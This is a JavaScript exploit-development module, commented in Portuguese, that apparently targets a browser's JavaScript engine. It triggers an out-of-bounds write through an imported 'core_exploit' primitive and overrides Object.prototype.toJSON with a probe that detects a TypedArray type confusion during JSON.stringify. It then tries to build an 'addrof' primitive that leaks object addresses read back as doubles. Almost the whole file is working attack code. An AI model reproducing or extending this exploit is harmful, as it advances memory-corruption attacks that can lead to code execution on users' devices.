// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v2_RelaxedThis)
// (Ou renomeie para testTypedArrayVictimAddrof_RelaxedThis.mjs)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V2_RELAXEDTHIS = "OriginalHeisenbug_TypedArrayAddrof_v2_RelaxedThis";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const LOCAL_HEISENBUG_CRITICAL_WRITE_VALUE = 0xFFFFFFFF;

let toJSON_call_details_TA_RT = null; // RT for RelaxedThis
let object_to_leak_A = null;
let object_to_leak_B = null;
let victim_typed_array_ref = null;

// Sonda para TypedArray com tentativa de Addrof e condição 'this' relaxada para escrita
function toJSON_TA_Probe_Addrof_RelaxedThis() {
    // Inicializa/reseta os detalhes para ESTA chamada da sonda.
    // A variável global toJSON_call_details_TA_RT será atualizada,
    // e a última atualização é o que será usado externamente.
    toJSON_call_details_TA_RT = {
        probe_variant: "TA_Probe_Addrof_v2_RelaxedThis",
        this_type_in_toJSON: "N/A_before_call",
        error_in_toJSON: null,
        probe_called: false,
        this_was_victim_ref_at_confusion: null
    };

    try {
        toJSON_call_details_TA_RT.probe_called = true;
        toJSON_call_details_TA_RT.this_type_in_toJSON = Object.prototype.toString.call(this);
        
        logS3(`[${toJSON_call_details_TA_RT.probe_variant}] Sonda invocada. Tipo de 'this': ${toJSON_call_details_TA_RT.this_type_in_toJSON}. 'this' === victim_typed_array_ref? ${this === victim_typed_array_ref}`, "leak");

        if (toJSON_call_details_TA_RT.this_type_in_toJSON === '[object Object]') {
            // A confusão de tipo ocorreu para 'this' NESTA invocação específica da sonda.
            logS3(`[${toJSON_call_details_TA_RT.probe_variant}] TYPE CONFUSION DETECTADA para 'this' (agora [object Object])!`, "vuln");
            
            const is_this_victim = (this === victim_typed_array_ref);
            toJSON_call_details_TA_RT.this_was_victim_ref_at_confusion = is_this_victim;
            logS3(`[${toJSON_call_details_TA_RT.probe_variant}] No momento da confusão, 'this' === victim_typed_array_ref? ${is_this_victim}`, "info");

            logS3(`[${toJSON_call_details_TA_RT.probe_variant}] Tentando escritas addrof no 'this' ([object Object])...`, "warn");
            if (object_to_leak_A) {
                this[0] = object_to_leak_A;
                logS3(`[${toJSON_call_details_TA_RT.probe_variant}] Escrita de object_to_leak_A em this[0] (supostamente) realizada.`, "info");
            }
            if (object_to_leak_B) {
                this[1] = object_to_leak_B;
                logS3(`[${toJSON_call_details_TA_RT.probe_variant}] Escrita de object_to_leak_B em this[1] (supostamente) realizada.`, "info");
            }
        } else if (this === victim_typed_array_ref) {
            // 'this' é nossa vítima, mas ainda não foi confundido NESTA invocação.
            logS3(`[${toJSON_call_details_TA_RT.probe_variant}] 'this' é victim_typed_array_ref, mas o tipo é ${toJSON_call_details_TA_RT.this_type_in_toJSON}. Sem confusão ainda para este 'this'.`, "info");
        } else {
            // 'this' não é nossa vítima E não está confundido (ou está confundido mas não é nossa vítima).
            logS3(`[${toJSON_call_details_TA_RT.probe_variant}] 'this' (tipo: ${toJSON_call_details_TA_RT.this_type_in_toJSON}) não é victim_typed_array_ref. Sem ação.`, "warn");
        }

    } catch (e) {
        toJSON_call_details_TA_RT.error_in_toJSON = `${e.name}: ${e.message}`;
        logS3(`[${toJSON_call_details_TA_RT.probe_variant}] ERRO na sonda: ${e.name} - ${e.message}`, "error");
    }
    return { minimal_TA_probe_executed_RT: true };
}


export async function executeTypedArrayVictimAddrofTest_RelaxedThis() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V2_RELAXEDTHIS}.triggerAndAddrof`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (TypedArray, This Relaxado) e Tentativa de Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V2_RELAXEDTHIS} Inic...`;

    // Reset das variáveis globais do módulo
    toJSON_call_details_TA_RT = null;
    victim_typed_array_ref = null;
    object_to_leak_A = { marker: "ObjA_TA_v2rt", id: Date.now() }; // v2rt for RelaxedThis
    object_to_leak_B = { marker: "ObjB_TA_v2rt", id: Date.now() + 456 };

    let errorCapturedMain = null;
    let stringifyOutput = null;
    let final_toJSON_details_capture = null; // Para capturar os detalhes da sonda antes do finally
    
    let addrof_result_A = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof A @ view[0]: Não tentado ou Heisenbug/escrita falhou." };
    let addrof_result_B = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof B @ view[1]: Não tentado ou Heisenbug/escrita falhou." };
    
    const fillPattern = 0.11223344556677; // Novo padrão

    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!oob_array_buffer_real && typeof oob_write_absolute !== 'function') {
            throw new Error("OOB Init falhou ou oob_write_absolute não está disponível.");
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
        logS3(`   Alvo da corrupção OOB em oob_array_buffer_real: ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)}`, "info", FNAME_CURRENT_TEST);

        logS3(`PASSO 1: Escrevendo valor CRÍTICO ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_VALUE)} em oob_array_buffer_real[${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, LOCAL_HEISENBUG_CRITICAL_WRITE_VALUE, 4);
        logS3(`  Escrita OOB crítica em ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} realizada.`, "info", FNAME_CURRENT_TEST);
        
        await PAUSE_S3(100);

        let underlying_ab = new ArrayBuffer(VICTIM_BUFFER_SIZE);
        victim_typed_array_ref = new Uint8Array(underlying_ab);
        let float64_view_on_underlying_ab = new Float64Array(underlying_ab);
        
        for(let i = 0; i < float64_view_on_underlying_ab.length; i++) {
            float64_view_on_underlying_ab[i] = fillPattern + i;
        }

        logS3(`PASSO 2: underlying_ab (tamanho ${VICTIM_BUFFER_SIZE} bytes) e victim_typed_array_ref (Uint8Array) criados. View preenchida com ${float64_view_on_underlying_ab[0]}.`, "test", FNAME_CURRENT_TEST);
        logS3(`   Tentando JSON.stringify em victim_typed_array_ref com ${toJSON_TA_Probe_Addrof_RelaxedThis.name}...`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: toJSON_TA_Probe_Addrof_RelaxedThis,
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_TA_Probe_Addrof_RelaxedThis.name}.`, "info", FNAME_CURRENT_TEST);

            logS3(`  Chamando JSON.stringify(victim_typed_array_ref)...`, "warn", FNAME_CURRENT_TEST);
            stringifyOutput = JSON.stringify(victim_typed_array_ref); 
            
            // Captura os detalhes da sonda (que refletem a última chamada)
            if (toJSON_call_details_TA_RT) {
                final_toJSON_details_capture = JSON.parse(JSON.stringify(toJSON_call_details_TA_RT)); // Cópia profunda
            }

            logS3(`  JSON.stringify(victim_typed_array_ref) completou. Resultado (da sonda stringify): ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
            logS3(`  Detalhes da sonda capturados (toJSON_call_details_TA_RT): ${final_toJSON_details_capture ? JSON.stringify(final_toJSON_details_capture) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            if (final_toJSON_details_capture && final_toJSON_details_capture.probe_called && final_toJSON_details_capture.this_type_in_toJSON === "[object Object]") {
                logS3(`  HEISENBUG NO TYPEDARRAY CONFIRMADA (via detalhes capturados)! Tipo de 'this' na última sonda: ${final_toJSON_details_capture.this_type_in_toJSON}`, "vuln", FNAME_CURRENT_TEST);
                if (final_toJSON_details_capture.this_was_victim_ref_at_confusion !== null) {
                    logS3(`    Na última sonda confusa, 'this' === victim_typed_array_ref? ${final_toJSON_details_capture.this_was_victim_ref_at_confusion}`, "info")
                }
                
                logS3("PASSO 3: Verificando float64_view_on_underlying_ab APÓS Heisenbug e tentativas de escrita na sonda...", "warn", FNAME_CURRENT_TEST);

                const val_A_double = float64_view_on_underlying_ab[0];
                addrof_result_A.leaked_address_as_double = val_A_double;
                let temp_buf_A = new ArrayBuffer(8); new Float64Array(temp_buf_A)[0] = val_A_double;
                addrof_result_A.leaked_address_as_int64 = new AdvancedInt64(new Uint32Array(temp_buf_A)[0], new Uint32Array(temp_buf_A)[1]);
                logS3(`  Valor lido de float64_view_on_underlying_ab[0] (para ObjA): ${val_A_double} (${addrof_result_A.leaked_address_as_int64.toString(true)})`, "leak", FNAME_CURRENT_TEST);

                if (val_A_double !== (fillPattern + 0) && val_A_double !== 0 &&
                    (addrof_result_A.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_A.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                    logS3("  !!!! VALOR LIDO em view[0] PARECE UM PONTEIRO POTENCIAL (ObjA) !!!!", "vuln", FNAME_CURRENT_TEST);
                    addrof_result_A.success = true;
                    addrof_result_A.message = "Heisenbug (TypedArray, RelaxedThis) confirmada E leitura de view[0] sugere um ponteiro para ObjA.";
                } else {
                    addrof_result_A.message = "Heisenbug (TypedArray, RelaxedThis) confirmada, mas valor lido de view[0] não parece ponteiro para ObjA ou buffer não foi alterado.";
                    if (val_A_double === (fillPattern + 0)) addrof_result_A.message += " (Valor é igual ao fillPattern inicial)";
                }

                const val_B_double = float64_view_on_underlying_ab[1];
                addrof_result_B.leaked_address_as_double = val_B_double;
                let temp_buf_B = new ArrayBuffer(8); new Float64Array(temp_buf_B)[0] = val_B_double;
                addrof_result_B.leaked_address_as_int64 = new AdvancedInt64(new Uint32Array(temp_buf_B)[0], new Uint32Array(temp_buf_B)[1]);
                logS3(`  Valor lido de float64_view_on_underlying_ab[1] (para ObjB): ${val_B_double} (${addrof_result_B.leaked_address_as_int64.toString(true)})`, "leak", FNAME_CURRENT_TEST);
                
                if (val_B_double !== (fillPattern + 1) && val_B_double !== 0 &&
                    (addrof_result_B.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_B.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                    logS3("  !!!! VALOR LIDO em view[1] PARECE UM PONTEIRO POTENCIAL (ObjB) !!!!", "vuln", FNAME_CURRENT_TEST);
                    addrof_result_B.success = true;
                    addrof_result_B.message = "Heisenbug (TypedArray, RelaxedThis) confirmada E leitura de view[1] sugere um ponteiro para ObjB.";
                } else {
                    addrof_result_B.message = "Heisenbug (TypedArray, RelaxedThis) confirmada, mas valor lido de view[1] não parece ponteiro para ObjB ou buffer não foi alterado.";
                    if (val_B_double === (fillPattern + 1)) addrof_result_B.message += " (Valor é igual ao fillPattern inicial)";
                }

                if (addrof_result_A.success || addrof_result_B.success) {
                    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V2_RELAXEDTHIS}: Addr? SUCESSO!`;
                } else {
                    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V2_RELAXEDTHIS}: Heisenbug OK, Addr Falhou`;
                }

            } else {
                let msg = "Heisenbug (TypedArray como [object Object]) não foi confirmada via detalhes capturados da sonda.";
                if(final_toJSON_details_capture && final_toJSON_details_capture.this_type_in_toJSON) msg += ` Tipo obs na última sonda: ${final_toJSON_details_capture.this_type_in_toJSON}`;
                else if (!final_toJSON_details_capture) msg += " Detalhes da sonda (final_toJSON_details_capture) são null.";
                addrof_result_A.message = msg; addrof_result_B.message = msg;
                logS3(`  ALERTA: ${msg}`, "error", FNAME_CURRENT_TEST);
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V2_RELAXEDTHIS}: Heisenbug Falhou`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`    ERRO CRÍTICO durante JSON.stringify ou lógica de addrof: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V2_RELAXEDTHIS}: Stringify/Addrof ERR`;
            addrof_result_A.message = `Erro na execução principal: ${e_str.name} - ${e_str.message}`;
            addrof_result_B.message = `Erro na execução principal: ${e_str.name} - ${e_str.message}`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                else delete Object.prototype[ppKey];
                logS3(`  Object.prototype.${ppKey} restaurado.`, "info", FNAME_CURRENT_TEST);
            }
        }

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`ERRO CRÍTICO GERAL no teste: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V2_RELAXEDTHIS} FALHOU CRITICAMENTE`;
        addrof_result_A.message = `Erro geral no teste: ${e_outer_main.name}`;
        addrof_result_B.message = `Erro geral no teste: ${e_outer_main.name}`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Resultado Addrof A (view[0]): Success=${addrof_result_A.success}, Msg='${addrof_result_A.message}'`, addrof_result_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        if(addrof_result_A.leaked_address_as_int64){
            logS3(`  Addrof A (Int64): ${addrof_result_A.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        }
        logS3(`Resultado Addrof B (view[1]): Success=${addrof_result_B.success}, Msg='${addrof_result_B.message}'`, addrof_result_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        if(addrof_result_B.leaked_address_as_int64){
            logS3(`  Addrof B (Int64): ${addrof_result_B.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        }
        
        // Limpeza das referências globais do módulo
        object_to_leak_A = null;
        object_to_leak_B = null;
        victim_typed_array_ref = null;
        toJSON_call_details_TA_RT = null; 
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: false,
        stringifyResult: stringifyOutput, 
        toJSON_details: final_toJSON_details_capture, // Retorna os detalhes capturados
        addrof_A_attempt_result: addrof_result_A,
        addrof_B_attempt_result: addrof_result_B
    };
}
